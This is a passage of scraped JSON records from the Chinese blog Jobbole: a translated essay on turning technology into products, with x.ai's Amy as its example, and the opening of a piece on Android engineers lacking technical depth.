register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111261votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111261\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 14 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/daofazi\">逆旅</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/daofazi\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/08/a84a2baaaa98a48bb36349cd6431bcb3.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            a programmer,Do one's level best and leave the rest to God's will.I love this saying.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/daofazi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/daofazi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/daofazi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 15</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx1.sinaimg.cn/large/63918611gy1ffv530saw0j20zk0k04b3.jpg"], "fav_nums": 14, "comment_nums": 0, "create_date": "2017/05/23", "praise_nums": 3}
{"tags": "管理,创意,创业,产品", "front_image_path": "full/3a4703a3b76c773b75f3f1e48bdc58af9ad2c150.jpg", "title": "如何把好技术变为好产品？", "url_object_id": "11035e2f16017675fe365a9ed61662b5", "url": "http://blog.jobbole.com/111268/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/young605867996\">Lada</a> 翻译，<a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://pivot.uk.com/productise/\">Paul Jackson</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><h3>产品化是什么意思？</h3>\n<p>大多数创业始于极好的创意和技术专长，但好技术和好产品有着天壤之别。这篇文章写给那些想构建用户实际使用的产品，而不是只解决问题但无法形成规模的技术。我用来形容这个过程的动词就是“产品化”。产品化意味着把某种东西（如好的创意、技术等）转化为产品。</p>\n<p><span id=\"pos_placeholder\" style=\"width: 0px; height: 0px; margin: 0px; padding: 0px;\"></span>我将探讨产品化的原则，并通过一个特定的例子来深入剖析。我所用的例子是 x.ai 的<strong> <a href=\"https://x.ai/\">Amy</a></strong>，一个扮演私人助手角色的智能机器人。2016 年，Amy 成为创业公司和 VC 社区必需的会议安排助手。</p>\n<p>我选择 Amy 缘于她是人工智能发展为消费品的一个典例，也是技术成功“产品化”的典例。</p>\n<p>Amy还值得一提的是因为 x.ai （创造Amy的公司） 自称“反精益生产”。作为产品人，我们都熟悉精益创业。精益生产成为产品开发的主流哲学有段时间了。因此看到傲称“反精益生产”的创业公司出现是有趣的。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/35d2b75d141d951d95e02e8d7c8cda65.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/35d2b75d141d951d95e02e8d7c8cda65.jpg\" alt=\"Productise1\"></a></p>\n<p style=\"text-align: center;\"><span style=\"color: #808080;\">感谢 x.ai 。</span></p>\n<p>如果我们想象一条“精益”的轴，在轴一端的是像 Airbnb、Dropbox 这样的独角兽公司。他们都是由 Y Combinator 铸造的“精益生产”典型。在轴另一端则是像特斯拉这样的公司。没人会把埃隆·马斯克评价为一个精益的实践者。他所做一切都是为了登月计划，需要巨额投资。</p>\n<p>在特斯拉的左边是一群 AI 公司，比如 x.ai 和 Clarif.ai 这些明确声明“精益生产不适合我们”的公司。x.ai 需要三年的研发投资，才能将产品投放市场。反精益生产则需要更多的前期资金，也提供更少的迭代和方向转变的机会。反精益生产的公司在产品投放市场时，需要对他们的用户和用户需求更有把握。</p>\n<h3>为什么产品化重要？</h3>\n<p>产品化意味着把愿景转化为可用的、具有全球吸引力的产品。产品化的主要好处在于它帮你跨越中断期（Chasm）。<strong><a href=\"https://www.youtube.com/watch?v=887i04NjDjc\">Geoffrey Moore</a> </strong>定义的有名的市场中断期，区分了吸引少数技术极客的公司与吸引大众市场的公司。他的同名书籍探索了影响创业公司飞跃中断期能力的所有因素。产品化正是其中一个方面。</p>\n<p>产品化同样可防止堆栈谬误（Stack Fallacy）。该想法来自 Oracle 曾经的产品经理，Storm Ventures 的现合伙人：<strong><a href=\"https://techcrunch.com/2016/01/18/why-big-companies-keep-failing-the-stack-fallacy/\">Anshu Sharma</a></strong>。堆栈谬误意味着，在所有给出的技术堆栈中，每个提供者都高估了自己产业层的价值；同样也低估了其他产业层的价值，尤其是那些堆栈中较高层级的提供者。</p>\n<p>数据库公司认为 SaaS 应用“不过是种数据库应用”，错误地自信他们也能轻易地开发、竞争并且赢得新市场，堆栈谬误正是导致他们有这种想法的原因。</p>\n<p>从 Anshu 的观点来看，那些占上风的公司赢在用户体验层，他们把理解终端用户的背景、动机和期望结果做到了极致。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/905d017da166b82092cce5cef8a775ac.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/905d017da166b82092cce5cef8a775ac.jpg\" alt=\"Productise2\"></a></p>\n<p>作为一个产品经理，我支持他的看法。以我的经验看来，赢得市场意味着思考用户价值，而不是盯着屏幕；产品化意味着关注产品效果而不是产品特性。</p>\n<p>我们都熟悉产品的”jobs-to-be-done“理论。人们不使用产品是因为他们喜欢该产品本身。相反，他们出租它能获得具体成果。我认为 Clay Christensen 的理论今年<strong><a href=\"http://www.forbes.com/sites/hbsworkingknowledge/2016/10/04/clayton-christensen-customers-dont-simply-buy-products-they-hire-them/#5a1412df5712\">获得了很大进展</a></strong>是有充分原因的。我坚信，多数实用产品都是帮助人类获得成果的工具，只有情感方面的东西能真正地超越它，比如品牌和美学。</p>\n<p>产品化意味着关注用户想要达成的结果，而不是底层的技术。因为在指数级的竞争中，这比以往任何时候都更加重要。在 Mary Meeker 的 2016 年互联网报告中，有两条统计结果映入我眼帘。第一条，在美国，人们80%的时间只花在三个应用上。不必费心去猜是哪三个应用。Nielsen data 在2016年底发布的数据显示，排名前 8 的移动应用<strong><a href=\"https://medium.freecodecamp.com/all-of-2016s-top-mobile-apps-are-owned-by-either-google-or-facebook-a9c56d77a74b#.t3p8049k7\">被两家公司包揽</a></strong>：Google 和 Facebook。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/f46f5d511ba25d913dedabf3c5a782fd.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/f46f5d511ba25d913dedabf3c5a782fd.png\" alt=\"Productise3\"></a></p>\n<p>第二条统计结果，50%的人一个月不下载新应用。这表明，新的市场进入者面临的挑战范围只在于获得关注。因为有太多选择，新应用的采用率已经趋于平稳。对创业公司而言，只有短暂时间给顾客留下印象。如果不能在这片刻表达你的价值，你就输了。</p>\n<h3>产品的三大支柱</h3>\n<p>而这对产品来说有什么意义？有三大支柱：用户引导（Onboarding）、核心任务的完成（Core Task Completion ）和管理（Administration）。你应该用这种方式思考你的产品。贯穿这三个核心支柱的量是用户的熟悉度。每个支柱上的设计，都要考虑用户与产品交互时，随时间变化的心态。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/e26959857a80efc51aeccecc48fb8bee.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/e26959857a80efc51aeccecc48fb8bee.jpg\" alt=\"Productise4\"></a></p>\n<p>用户对产品的理解始于用户引导。在这点上，他们对你所做的东西会只有极少的了解。如果用户在用户引导后继续，并开始使用产品去完成任务，他们必然会变得更加熟悉产品。假如他们继续使用，该产品将会成为他们生活的一部分，那么产品的管理就逐渐地变得重要。</p>\n<p>可能在这三个支柱的左边还会加上第四个支柱：用户获取（Acquisition）。用户获取发生在用户第一次知道你产品的时候。我不会介绍用户获取的全部细节，因为它是市场营销技术的一部分，属于产品范围外。但重要的是，要记住产品和营销都是相同统一体的组成部分。</p>\n<p><strong><a href=\"https://medium.freecodecamp.com/all-of-2016s-top-mobile-apps-are-owned-by-either-google-or-facebook-a9c56d77a74b#.t3p8049k7\">Chamath Palihapitiya</a></strong> 在观察后做了很好的应用，</p>\n<p><strong><strong>「用户只有三个状态：从没听过；尝试过；在使用。你要管理的是状态改变。」</strong></strong></p>\n<p>理解用户的心态是成功发展每个支柱的关键。你需要询问用户在每个状态的反馈。在用户获取状态，用户不了解产品，不了解产品的任何事。他们会说：『你是什么产品？为什么我要使用你？为什么我需要那么在意？』在用户引导时，他们会说：『我在考虑，我想花时间使用你。我会想起你，但你仍需使我信服。』</p>\n<p>一旦用户做到了核心任务的完成，他们就经过了一个重要里程碑。这时他们会讲：『我明白了，我理解了你是关于什么的，并且看到了你的价值。』而管理支柱则与定制有关，用户会说：『我得到了你提供的价值，但希望你适应我的需求。』</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/1384e5be3877314abbdd1f2ab1bd3faf.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/1384e5be3877314abbdd1f2ab1bd3faf.jpg\" alt=\"Productise5\"></a></p>\n<p>如果你熟悉 Dave McClure 的”海盗指标“，可以把它映射到这四个支柱。在左边是获取(Acquisition)指标，激活(Activation)出现在用户引导，留存(Retention)和收入(Revenue)是核心任务，推荐(Referral)通常在管理阶段。这样你可以实际地预计用户对产品的支持。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/428daaa985a920814fe19bcae435aad3.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/428daaa985a920814fe19bcae435aad3.jpg\" alt=\"Productise6\"></a></p>\n<h3>产品价值</h3>\n<p>赢在产品，就是赢在用户价值的思考。如果你想了解更多关于产品价值的信息，Jerry Chen（ 他和 Reid Hoffman、Josh Elman 共同工作于 Greylock Partners）有一个叫做价值单元（ <strong><a href=\"https://news.greylock.com/unit-of-value-a-framework-for-scaling-42c092fba887#.rscicw5ib\"><span id=\"2KSFindDIV\" class=\"KSFIND_CLASS\">Unit of </span>Value</a></strong>）的平台非常值得一读。Jerry 评估了像 Salesforce、Dropbox 和 Docker 这些独角兽公司的价值单元。然后他论证了他们是如何实现和影响了服务价值的。</p>\n<p class=\"okmemo-dragging\">产品是”价值交付的载体“。假如你正在开发新产品，或是有想法要开发，你需要回答的基础问题是：它能实现怎样的价值单元？答案会影响你如何定价、确定规模和销售产品。用户获取和承诺的价值（promise of value）相联系。用户引导需要推算价值（demonstrate of value）。实现的价值（delivery of value）体现在核心任务的完成。管理与价值扩展（extension of value）有关。它帮助用户获得更多价值，同样也是你可以追加销售产品的地方。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/685cc469242ed96e85818eea27c5d554.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/685cc469242ed96e85818eea27c5d554.jpg\" alt=\"Productise7\"></a></p>\n<p>一旦理解了你产品的价值单元，发展它就会更容易。对发展需求排出优先级列表是产品经理角色的基础能力。我发现的这个 2×2 网格（有名的<strong><a href=\"https://blog.intercom.com/first-rule-prioritization-no-snacking/\">影响/成就网格</a></strong>）是一个用四象限进行优先级划分的高效工具。Hunter Walk （YouTube的产品掌门人）在Intercom团队内是该工具有名的支持者。</p>\n<p>需要考虑的是，所有的路径事项都应该位于影响网格的上半部分。如果一个事项不能帮助兑现你的价值单元，它就不应该存在。<span id=\"0KSFindDIV\" class=\"KSFIND_CLASS\">战略主题（ Strategic Themes）</span>应该放在右上象限。在用关键的利益相关点填充这个网格时，产品经理可以对产品团队应该做什么和不应该做什么达成共识。</p>\n<p>举个例子，下面是我在 2017 年开发的一款名为 Newsmart 的产品路径图，这是一款利用华尔街日报内容制作的商务英语学习产品。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/d13a800f91a3104116d34c9e09ff3f41.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/d13a800f91a3104116d34c9e09ff3f41.jpg\" alt=\"Productise8\"></a></p>\n<p>任何产品给定的 1.0 版本都只包含任务完成这一支柱。没有人会从建立用户引导开始。它只是一条指向核心产品的路径。产品化意味着从这一支柱向外推进，并增加额外的支柱。产品化意味着建立路径让用户找到你的产品，了解它，使用它，然后定制它。</p>\n<p>在 B2B 领域，由于买家和用户是不同的人，所以存在另外的复杂性。买方的价值单元与用户的价值单元会非常不同。我们很容易忽视买家的需求，不断地改善终端用户的体验。而买家是最终决定是否投资予你的人。产品需要同时论证并实现价值。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/1fa006d1488a9338ac7f27d114d461ea.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/1fa006d1488a9338ac7f27d114d461ea.jpg\" alt=\"Productise9\"></a></p>\n<p>尽管管理支柱在消费产品中没有被太多考虑，但在 B2B 它是最重要的元素之一。买家如何评估他们的投资能否得到回报?通常通过告知他们用户是否在使用该产品、使用多久的指标板或报告。在 Newsmart 里，我们很长一段时间忽视了这问题的重要性。我们很晚才意识到开发一套管理软件的重要性，这意味着不仅是用户，买家也能看到价值。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/ef6974f4c8bfef9647499a8f4465ae92.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/ef6974f4c8bfef9647499a8f4465ae92.jpg\" alt=\"Productise10\"></a></p>\n<p>从消费者领域开始的产品在转而面向企业后，进入了一个完全不同的领域。你该如何沟通以及市场如何变化。你不再需要说服单一用户，却需要使各种各样的利益相关者信服。要在企业中取得成功就需经历许多障碍。 Slack 最近宣布了<strong><a href=\"https://techcrunch.com/2016/12/07/slack-and-google-announce-partnership-focused-on-better-integrating-their-services/\">与 Google 的 G-Suite 合作</a></strong>。在我看来，这表明即使是他们也在设法解决这个问题。他们在终端用户中获得了良好的支持，却要奋力地让他们的产品进入企业市场，并意识到 Google 在这一领域走得更远。</p>\n<h3>产品设计模式</h3>\n<p>如果你检查这四根支柱，每一根支柱的讨论都是相当超前的。设计模式都已建立，可以转换后适应于你的产品中。没有必要重新发明轮子，也不需要每次都经历相同的学习曲线。</p>\n<p>例如用户引导。有如 Samuel Hulick 这样有趣的人。 围绕用户引导，他建立了一套名为 <strong><a href=\"https://www.useronboard.com/\">User Onboard</a> </strong>的完整业务。他的专长是『分解』，分解评估不同产品的用户引导情况，并指出每种产品的优点和缺点。产品经理可以打开 User Onboard，快速了解不同产品在多个垂直领域的最佳实践。</p>\n<p>用户引导的核心是”Aha！时刻“。Aha！是指用户理解了产品价值和产品与他关系的瞬间。用户引导的成功意味着让用户尽快迎来 Aha！时刻。随着争夺用户注意力的竞争越来越激烈，进入Aha！时刻的时间需要更短。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/f4d8e46bb8ff2a7b7d8b496e5d3d00a3.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/f4d8e46bb8ff2a7b7d8b496e5d3d00a3.jpg\" alt=\"Productise11\"></a></p>\n<p>此外，Chamath Palihapitiya 是一个很好的参考。他是 Facebook 增长团队 2008 年至 2012 年间的负责人。在沟通方式上，他非常直接、粗鲁。偶然发现他<strong><a href=\"https://www.youtube.com/watch?v=raIUQP71SBU\">在 YouTube 上的这段经典言论</a></strong>，他直接拒绝关于增长和”增长黑客“的很多伪科学。对他而言，增长就是了解产品所有的价值单元。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/283c18bc8e57a926a104a2723e755449.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/283c18bc8e57a926a104a2723e755449.jpg\" alt=\"Productise12\"></a></p>\n<p>如果有人对用户引导的重要性有所怀疑，我就把 Twitter 作为一个很好的反例，来说明如果不正确对待它的后果。2016 年对 Twitter 来说不是很顺。这一年公司业务趋于水平、增长巨减、股价持续低迷。</p>\n<p>问题的核心是未能联系起它的价值单元。太多的人仍然不了解 Twitter 是什么、以及为什么要使用它。这是市场营销的失败，也是用户引导的失败。有较高比例的人注册了却不发推特消息、也不关注任何人。如果没有进行到这些阶段，就意味着永远无法获得”Aha！时刻“。如果不能获得”Aha！时刻“，就无法理解产品价值。不能理解产品价值，用户就会流失。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/d988258f0e93bff0d1ca242b1ba66e48.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/d988258f0e93bff0d1ca242b1ba66e48.jpg\" alt=\"Productise13\"></a></p>\n<p>为了深入探讨，来看一个用户引导的成功例子。我选择 x.ai 的 Amy 原因，从根本上讲，是由于她是种技术，而不是产品。开发人工智能和决策引擎使用了相当多的资源。因此当她面向市场时，可以应用在许多方向。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/4f2db693c89d3f84c5c481bdf12d88f1.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/4f2db693c89d3f84c5c481bdf12d88f1.jpg\" alt=\"Productise14\"></a></p>\n<p>我认为 x.ai 在产品的角度上做了很多出色的选择。Amy 的用户引导简单但高效。一旦你注册，她就会给你发电子邮件，并说：”你好，我是你的私人助理，很高兴能来到你的面板“，然后让你进行一些操作。我们都会接收并回复电子邮件。因此，这样的交互是常见的。</p>\n<p>如果你检查 Amy 的第一封电子邮件，她清楚地说明了价值定位。”魔法“，她说，”在13次会议后发生。“为了展示价值定位，她会为你安排第一次会议。她发送邀请并问：”你要在这周四的时候加个会议提醒吗？“接受会议后，会看到它落在你的日历上，然后你就理解了她的价值。这正是”Aha！时刻“。突然之间，Amy 从某种新奇陌生的东西变得熟悉了。这是一个大家都能理解的设计模式。</p>\n<p>Amy 可以容易地保持会议日程安排的技术。在产品化过程中，x.ai 评估我们的心智模型，并利用了一些已知的东西，而不是引入外来的东西。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/b08dbdc42399c9c6b353d8cd197f4585.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/b08dbdc42399c9c6b353d8cd197f4585.jpg\" alt=\"Productise15\"></a></p>\n<p>Amy 核心任务的完成出现在她与各种收件人的邮件之中。在这些邮件交换中，她协调不同的日程表，最终安排一个会议。</p>\n<p>在管理方面，个人偏好对 Amy 来说是关键。多数人都不希望周日上午 9 点开会。我试着在早上安排我多数的面对面会议，让下午空闲，而我的设置也反映了这点。当然，偏好会随时间改变。当设置更新时，Amy 会给你发邮件确认。</p>\n<p>对我来说，Amy 是一个优秀的当代产品化例子。她的价值单元是节省的时间。Amy 根据你的使用情况进行计算，并发送更新来略述她每个月节省了你多少小时。这相当于每年节省了几十个小时。</p>\n<h3>支付</h3>\n<p>在某些情况下，多数产品将会从用户那获得报酬。这是常被忽视的另一步。这方面的设计模式也有很好的发展。有许多”<strong><a href=\"http://white.net/blog/six-principles-good-choice-architecture/\">选择架构</a>“</strong>的研究和支付计划的介绍。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/456da5220854b0886e74570cee3f2109.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/456da5220854b0886e74570cee3f2109.jpg\" alt=\"Productise16\"></a></p>\n<p>目标用户的可支付范围同样值得评估。Newsmart 主要面向亚洲销售。我们通过 Stripe 支持 PayPal 和信用卡。一段时间后，用户反馈的一致的信息是：“我想付钱，但无法支付！”我们在中国，台湾和韩国首选支付方式上的无知，意味着我们采取的某种方式是非常缓慢的。</p>\n<p>如果你是中国人，支付宝很可能是你的首选在线支付方式，银联也很普及，而 PayPal 几乎无处使用。你要确保研究过信用卡在目标市场的渗透力。在美国以外的许多国家，这一比例非常低——不到50%。如果你不支持本地支付，你就把钱留在了市场上。用户可能想要付费，但无法支付。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/33aa314b85797ad375f2f8f8686620e1.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/33aa314b85797ad375f2f8f8686620e1.jpg\" alt=\"\"></a></p>\n<h3>连接模型</h3>\n<p>用户心理学对有效地产品化至关重要，有种值得理解的设计范例是Nir Eyal的”<strong><a href=\"https://medium.com/behavior-design/how-to-manufacture-desire-3011c82a2b28#.72l79qwlk\">连接模型</a>“</strong>。Nir Eyal 是 BJ Fogg 的学生，他引用了 BJ Fogg 的行为理论。行为理论将行为视作动机、能力和触发的结果。Nir 研究了高粘性产品的共同元素。在他看来，Facebook、Snapchat、WhatsApp，还有 LinkedIn，都完美地创造了影响行为改变的因素。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/76f428ff24be0851a1be931c8601666a.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/76f428ff24be0851a1be931c8601666a.jpg\" alt=\"Productise18\"></a></p>\n<p>高粘性的产品是那些能逮住动机和触发时刻的产品。如果产品是一款应用，触发很可能是一条通知，告知用户，”什么事在这里发生，你就要错过了。“要知道通知总是把你拉进产品去。如果你收到 Facebook 的电子邮件，就会有一个电话让你使用产品。在 Nir 的模型中，最强大的激励因素被称为”可变奖励“。从心理上来说，这比霹雳可卡因更容易上瘾。</p>\n<p>可变性在产品体验中注入了未知元素。它产生了一种FOMO的感觉，迫使用户采取行动。触发和可变奖励的结合是促使我们对 Snapchat 和 Facebook 进行强制检查的原因。FOMO 同时也阻止我们离开这个平台。你有多少次听到有人宣称已经厌倦了 Facebook，并计划停止使用它？但从来没有人这样做。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/0e5d4ca1521b9b5bb4bb5001d94a8188.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/0e5d4ca1521b9b5bb4bb5001d94a8188.jpg\" alt=\"Productise19\"></a></p>\n<h3>总结产品化</h3>\n<p>如果你想建立一个产品，而不仅是一项技术，那就从思考价值开始。一旦你理解了产品提供的价值，想想如何沟通、论证和实现。注意用户对产品的熟悉程度。并且永远不要忽略他们努力想获得的结果。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/01/d97bd4f91d6567e36a91d9674306ac14.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/d97bd4f91d6567e36a91d9674306ac14.jpg\" alt=\"Productise20\"></a></p>\n<p>（本文改编自我在伦敦 TechCity 最近的演讲。你可以在 <strong><a href=\"http://www.slideshare.net/kromagz/productised\">Slideshare</a></strong> 找到相关信息。)</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111268\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111268votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111268\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996\">Lada</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/B77EEB9D520DE9C7BD42E89DC348FEC7/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            希望了解更多互联网、创业管理、创新思维、前沿技术和设计的知识。渐进明细，持续改进。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/young605867996\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/young605867996/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://littlejanery.blog.163.com/\"><i class=\"fa fa-link\"></i></a> <a title=\"QQ：605867996\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：yao605867996\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/35d2b75d141d951d95e02e8d7c8cda65.jpg"], "fav_nums": 4, "comment_nums": 0, "create_date": "2017/05/24", "praise_nums": 1}
{"tags": " 1 评论 ,职场,程序员,面试", "front_image_path": "full/d395e25b01ef3db391cf2cfb6f5dd73c75721003.jpg", "title": "面试解惑：没有技术深度的苦恼", "url_object_id": "a631e4d3ccc4bde14646e6c7d1829be8", "url": "http://blog.jobbole.com/110992/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.jianshu.com/p/40d24a1f6958\">goeasyway</a>   </div><p>最近有一位读者去今日头条面试 Android 开发，这位读者师出名门（BAT中的一家公司），是有十年的软件开发经验的高级 Android 工程师，但今日头条却以没有技术深度拒绝了他。</p>\n<p>昨天早上，我在给他做模拟面试的时候也发现了这个问题，因为从简历上看他的出身，呆过两家知名的互联网公司，面试官一定会不自觉的提升对他的期望。他虽然有丰富的项目经验，但真正交流下来又发现虽然在知名公司工作却没有掌握“核心科技”，他的优势一下就变成了劣势。</p>\n<blockquote><p>随着年龄的增长，你原来的优势都在慢慢变成你的劣势。</p></blockquote>\n<h3>写给资深或即将资深的Android工程师</h3>\n<p>当我们是初级工程师的时候，最希望的就是有丰富的项目经验，好把自己苍白干瘪的简历填的炫丽饱满。然而随着时间的积累，简历上的项目是挺“饱满”的了，但我们只看“外表”的行为造成了自己另一个困境：看似很资深，其实又没有做过什么有难度的事情，工作了十年可能只是 1 年的工作经验用了 9 